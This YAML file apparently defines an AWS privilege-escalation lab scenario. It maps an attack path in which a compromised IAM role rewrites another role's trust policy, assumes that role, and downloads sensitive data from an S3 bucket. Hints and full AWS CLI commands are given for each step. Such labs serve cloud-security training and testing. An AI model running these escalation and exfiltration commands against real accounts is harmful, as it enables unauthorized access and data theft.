attackMap:
  nodes:
    - id: starting-principal
      label: "Starting Role"
      type: principal
      subType: iam-role
      arn: "arn:aws:iam::{account_id}:role/pl-prod-iam-012-to-bucket-starting-role"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM role has iam:UpdateAssumeRolePolicy permission on the target role,
        allowing it to modify the trust policy and add itself as a trusted principal.

    - id: target-role
      label: "Target Role"
      type: principal
      subType: iam-role
      arn: "arn:aws:iam::{account_id}:role/pl-prod-iam-012-to-bucket-target-role"
      description: >
        This IAM role has S3 read/write permissions on the sensitive data bucket.
        Its trust policy currently does not allow the starting role to assume it,
        but the starting role can use iam:UpdateAssumeRolePolicy to change that.

    - id: target-bucket
      label: "Sensitive S3 Bucket"
      type: resource
      subType: s3-bucket
      isTarget: true
      arn: "arn:aws:s3:::pl-prod-iam-012-to-bucket-{account_id}-{resource_suffix}"
      description: >
        This S3 bucket contains sensitive data. Once you have assumed the target role,
        you can read and download its contents using s3:GetObject.

  edges:
    - from: starting-principal
      to: target-role
      label: "iam:UpdateAssumeRolePolicy"
      description: >
        Modify the trust policy of the target role to allow the starting role to
        assume it. This grants the attacker a path to the S3 bucket.
      hints:
        - "You have a permission that lets you change who is allowed to assume a role -- think about what that unlocks."
        - "Use iam:ListRoles to discover which roles exist in the account and look for ones with S3 access."
        - "Use iam:GetRole on the target role to read its current trust policy and understand why you cannot assume it yet."
        - "The trust policy is just a JSON document -- you have a permission that lets you replace it entirely."
        - "When writing the new trust policy, the Principal should be the ARN of your current role."
        - "Browse to https://pathfinding.cloud/paths/iam-012 for technique details on this escalation path."
      commands:
        - description: "Get the current trust policy of the target role"
          command: "aws iam get-role --role-name pl-prod-iam-012-to-bucket-target-role --query 'Role.AssumeRolePolicyDocument'"
        - description: "Update the trust policy to allow the starting role to assume the target role"
          command: |
            aws iam update-assume-role-policy \
              --role-name pl-prod-iam-012-to-bucket-target-role \
              --policy-document '{
                "Version": "2012-10-17",
                "Statement": [{
                  "Effect": "Allow",
                  "Principal": {"AWS": "arn:aws:iam::{account_id}:role/pl-prod-iam-012-to-bucket-starting-role"},
                  "Action": "sts:AssumeRole"
                }]
              }'

    - from: target-role
      to: target-bucket
      label: "sts:AssumeRole → s3:GetObject"
      description: >
        Assume the target role using the now-modified trust policy, then use the
        role's S3 permissions to read sensitive data from the bucket.
      hints:
        - "IAM changes take time to propagate -- wait about 15 seconds before attempting to assume the role."
        - "Use sts:AssumeRole with the target role ARN and export the returned credentials into your shell."
        - "Once you have the target role's credentials, use aws s3 ls to confirm bucket access."
        - "Download the sensitive file from the bucket with aws s3 cp."
      commands:
        - description: "Assume the target role"
          command: "aws sts assume-role --role-arn arn:aws:iam::{account_id}:role/pl-prod-iam-012-to-bucket-target-role --role-session-name attacker-session"
        - description: "List bucket contents"
          command: "aws s3 ls s3://pl-prod-iam-012-to-bucket-{account_id}-{resource_suffix}"
        - description: "Download sensitive data"
          command: "aws s3 cp s3://pl-prod-iam-012-to-bucket-{account_id}-{resource_suffix}/sensitive-data.txt ."
